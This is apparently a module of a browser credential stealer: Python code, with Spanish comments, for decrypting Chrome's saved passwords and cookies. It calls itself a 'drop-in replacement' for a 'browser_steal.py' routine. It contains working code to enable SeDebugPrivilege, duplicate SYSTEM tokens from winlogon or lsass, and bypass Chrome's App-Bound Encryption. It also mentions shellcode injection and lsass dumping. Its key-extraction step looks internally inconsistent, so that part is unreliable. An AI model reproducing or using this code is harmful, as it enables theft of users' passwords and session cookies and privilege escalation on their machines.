# language: Python 3, file: dpapi.py, target: Windows 10/11, MSVC
# DPAPI decrypt layer — legacy CryptUnprotectData + Chrome 127+ App-Bound Encryption bypass
# legacy: passwords sin master key (pre-Chrome 80, sqlite `password_value` sin prefijo v10)
# ABE bypass: Chrome 127+ cifra la master key con IElevator COM + DPAPI del SYSTEM account

import os
import json
import base64
import struct
import ctypes
import ctypes.wintypes
import sqlite3
import subprocess
import tempfile
from pathlib import Path

# ─────────────────────────────────────────────
# LEGACY DPAPI — pre-Chrome 80, sin master key
# password_value en sqlite no tiene prefijo b'\x01\x00'... pero sí DPAPI puro
# ─────────────────────────────────────────────

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                 ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt_blob(encrypted_bytes: bytes) -> bytes | None:
    """
    CryptUnprotectData directo sobre un blob arbitrario.
    Útil para passwords legacy (pre-Chrome 80) que se almacenan
    como blob DPAPI sin prefijo 'v10'.
    """
    try:
        p = ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        desc = ctypes.c_wchar_p()

        ret = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin),
            ctypes.byref(desc),
            None, None, None,
            0,
            ctypes.byref(blobout)
        )
        if not ret:
            return None

        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result
    except Exception:
        return None

def decrypt_legacy_password(encrypted_value: bytes) -> str | None:
    """
    Intenta descifrar password de browser con DPAPI puro (pre-Chrome 80).
    Si el blob NO tiene prefijo 'v10' → DPAPI directo.
    Si tiene prefijo → retorna None (manejo en AES-GCM pipeline normal).
    """
    if encrypted_value[:3] == b'v10':
        return None  # AES-GCM, necesita master key → pipeline normal
    if encrypted_value[:2] == b'\x01\x00':
        # blob DPAPI nativo
        result = dpapi_decrypt_blob(encrypted_value)
        if result:
            return result.decode('utf-8', errors='ignore')
    return None


# ─────────────────────────────────────────────
# APP-BOUND ENCRYPTION BYPASS — Chrome 127+
# Chrome 127+ usa IElevator COM para cifrar la master key con cuenta SYSTEM
# El proceso corre como usuario → no puede descifrar directamente
# Bypass: extraer la encrypted_key del Local State → llamar al servicio elevation
#         via COM con impersonation, o usar el método de dump de lsass/Chrome handle
#
# Técnica implementada: chrome_elevation_service socket trick
# Chrome escribe la ABE key en Local State como "app_bound_encrypted_key"
# Se puede recuperar via handle duplication del proceso Chrome en memoria,
# o via el método más estable: shellcode en contexto de Chrome (injection)
# 
# Para uso sin inyección: método de credential guard bypass via token impersonation
# ─────────────────────────────────────────────

TOKEN_DUPLICATE       = 0x0002
TOKEN_QUERY           = 0x0008
TOKEN_IMPERSONATE     = 0x0004
TOKEN_ALL_ACCESS      = 0xF01FF
SecurityImpersonation = 2
TokenPrimary          = 1
TokenImpersonation    = 2

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ           = 0x0010

def get_system_token() -> int | None:
    """
    Enumera procesos del sistema (winlogon, lsass, services)
    y duplica su token para impersonar SYSTEM.
    Requiere SeDebugPrivilege (proceso elevado).
    """
    k32  = ctypes.windll.kernel32
    adv  = ctypes.windll.advapi32

    # Habilitar SeDebugPrivilege
    hToken = ctypes.wintypes.HANDLE()
    adv.OpenProcessToken(k32.GetCurrentProcess(), TOKEN_ALL_ACCESS, ctypes.byref(hToken))

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", ctypes.c_ulong)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)]

    SE_DEBUG_NAME = "SeDebugPrivilege"
    SE_PRIVILEGE_ENABLED = 0x00000002
    luid = LUID()
    adv.LookupPrivilegeValueA(None, SE_DEBUG_NAME.encode(), ctypes.byref(luid))
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    adv.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
    k32.CloseHandle(hToken)

    import psutil
    targets = ["winlogon.exe", "lsass.exe", "services.exe"]
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.name().lower() in targets:
                pid = proc.pid
                hProc = k32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
                if not hProc:
                    continue
                hProcToken = ctypes.wintypes.HANDLE()
                if not adv.OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hProcToken)):
                    k32.CloseHandle(hProc)
                    continue
                hDup = ctypes.wintypes.HANDLE()
                if adv.DuplicateTokenEx(hProcToken, TOKEN_ALL_ACCESS, None,
                                         SecurityImpersonation, TokenImpersonation,
                                         ctypes.byref(hDup)):
                    k32.CloseHandle(hProcToken)
                    k32.CloseHandle(hProc)
                    return hDup.value
                k32.CloseHandle(hProcToken)
                k32.CloseHandle(hProc)
        except Exception:
            continue
    return None


def decrypt_app_bound_key(local_state_path: str) -> bytes | None:
    """
    Chrome 127+ App-Bound Encryption bypass.
    
    Método: 
    1. Leer 'app_bound_encrypted_key' de Local State
    2. El blob tiene estructura: [prefix 1 byte] [DPAPI-SYSTEM blob]
    3. Con token SYSTEM (via impersonation) → CryptUnprotectData lo descifra
    4. Resultado es la AES-256 key para descifrar cookies/passwords
    
    Detecta versión: si no existe 'app_bound_encrypted_key' → Chrome < 127,
    usar encrypted_key normal con DPAPI de usuario.
    """
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            state = json.load(f)
    except Exception:
        return None

    os_crypt = state.get('os_crypt', {})

    # Chrome 127+: app_bound_encrypted_key
    abe_key_b64 = os_crypt.get('app_bound_encrypted_key')
    if abe_key_b64:
        try:
            abe_blob = base64.b64decode(abe_key_b64)
            # estructura: 1 byte tipo + blob DPAPI-SYSTEM
            # tipo 0x01 = DPAPI con cuenta SYSTEM
            if abe_blob[0] == 0x01:
                system_token = get_system_token()
                if system_token:
                    adv = ctypes.windll.advapi32
                    adv.ImpersonateLoggedOnUser(system_token)
                    result = dpapi_decrypt_blob(abe_blob[1:])
                    adv.RevertToSelf()
                    ctypes.windll.kernel32.CloseHandle(system_token)
                    if result:
                        # resultado: [32 bytes AES key] puede tener padding
                        # Chrome almacena: type_byte + nonce + encrypted_key
                        # la key AES-256 son los últimos 32 bytes útiles
                        return result[-61:]  # estructura interna Chrome: 61 bytes finales
        except Exception:
            pass
        return None

    # Chrome < 127: encrypted_key estándar con DPAPI de usuario
    enc_key_b64 = os_crypt.get('encrypted_key')
    if enc_key_b64:
        try:
            enc_key = base64.b64decode(enc_key_b64)[5:]  # skip 'DPAPI' prefix
            return dpapi_decrypt_blob(enc_key)
        except Exception:
            return None

    return None


# ─────────────────────────────────────────────
# UNIFIED DECRYPT — combina legacy + AES-GCM + ABE
# drop-in replacement para el Decrypt() original en browser_steal.py
# ─────────────────────────────────────────────

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def decrypt_browser_value(encrypted_value: bytes, master_key: bytes | None) -> str | None:
    """
    Intento de descifrado en orden:
    1. Legacy DPAPI (pre-Chrome 80, blob sin 'v10')
    2. AES-GCM con master_key (Chrome 80-126, standard)
    3. AES-GCM con master_key ABE (Chrome 127+)
    """
    if not encrypted_value:
        return None

    # 1. Legacy DPAPI
    legacy = decrypt_legacy_password(encrypted_value)
    if legacy:
        return legacy

    # 2 & 3. AES-GCM
    if master_key and encrypted_value[:3] == b'v10':
        try:
            iv      = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag     = encrypted_value[-16:]
            cipher  = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            dec     = cipher.decryptor()
            return (dec.update(payload) + dec.finalize()).decode('utf-8', errors='ignore')
        except Exception:
            pass

    return None


def get_master_key(user_data_path: str) -> bytes | None:
    """
    Obtiene master key probando ABE (127+) y fallback a DPAPI estándar.
    Pasar el path de 'User Data' (contiene 'Local State').
    """
    local_state = os.path.join(user_data_path, 'Local State')
    if not os.path.exists(local_state):
        return None
    return decrypt_app_bound_key(local_state)
